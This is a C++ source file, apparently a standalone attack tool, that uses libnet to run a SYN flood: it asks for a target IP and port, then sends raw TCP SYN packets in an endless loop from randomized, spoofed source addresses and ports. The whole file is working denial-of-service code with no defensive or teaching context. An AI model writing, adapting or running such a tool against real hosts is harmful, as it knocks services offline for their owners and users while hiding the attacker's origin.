#include <arpa/inet.h>
#include <cstdlib>
#include <iostream>
#include <libnet.h>
#include <libnet/libnet-functions.h>
#include <libnet/libnet-headers.h>
#include <pcap.h>
#include <pcap/pcap.h>

char *print_ip(uint32_t *ip_addr_ptr) {
  return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
}

int syn_flood() {
  std::string ip;
  std::string port_temp;

  std::cout << "  input ip: ";
  std::cin >> ip;

  std::cout << "  input port: ";
  std::cin >> port_temp;

  int byte_count;
  int packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;
  libnet_ptag_t packet;

  /*
  char errbuf_pcap[PCAP_ERRBUF_SIZE];
  char *device = pcap_lookupdev(errbuf_pcap);
  if (device == nullptr) {
    std::cerr << "[!!] pcap_lookupdev: " << errbuf_pcap << std::endl;
    return 1;
  }
  */

  char errbuf_libnet[LIBNET_ERRBUF_SIZE];
  libnet_t *l = libnet_init(LIBNET_RAW4, "wlan0", errbuf_libnet);
  if (l == nullptr) {
    std::cerr << "[!!] libnet_init: " << errbuf_libnet << std::endl;
    return 1;
  }

  uint32_t dst_ip = libnet_name2addr4(l, ip.c_str(), LIBNET_RESOLVE);
  if (dst_ip == (uint32_t)-1) {
    std::cerr << "[!!] libnet_name2addr4: " << errbuf_libnet << std::endl;
    libnet_destroy(l);
    return 1;
  }

  long port = strtol(port_temp.c_str(), nullptr, 10);
  if (port <= 0 || port > 65535) {
    std::cerr << "[!!] port: " << errbuf_libnet << std::endl;
    libnet_destroy(l);
    return 1;
  }
  uint16_t dst_port = (uint16_t)port;

  std::cout << "  \033[38;5;196mSYN-flood:\t" << print_ip(&dst_ip) << ":"
            << dst_port << "..." << "\033[0m" << std::endl;
  // std::cout << "Press 'Enter' to close";
  while (true) {
    libnet_clear_packet(l);

    libnet_ptag_t tcp_tag = libnet_build_tcp(
        libnet_get_prand(LIBNET_PRu16), dst_port,
        libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32), TH_SYN,
        libnet_get_prand(LIBNET_PRu16), 0, 0, LIBNET_TCP_H, nullptr, 0, l, 0);

    if (tcp_tag == (libnet_ptag_t)-1) {
      std::cerr << "Error building TCP: " << libnet_geterror(l) << std::endl;
      continue;
    }

    libnet_ptag_t ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H, IPTOS_LOWDELAY,
        libnet_get_prand(LIBNET_PRu16), 0, libnet_get_prand(LIBNET_PR8),
        IPPROTO_TCP, 0, libnet_get_prand(LIBNET_PRu32), dst_ip, nullptr, 0, l, 0

    );

    if (ip_tag == (libnet_ptag_t)-1) {
      std::cerr << "Error building IP: " << libnet_geterror(l) << std::endl;
      continue;
    }

    int bytes = libnet_write(l);
    if (bytes == -1) {
      std::cerr << "Write error: " << libnet_geterror(l) << std::endl;
    }

    usleep(5000);
  }
  libnet_destroy(l);
  return 0;
}
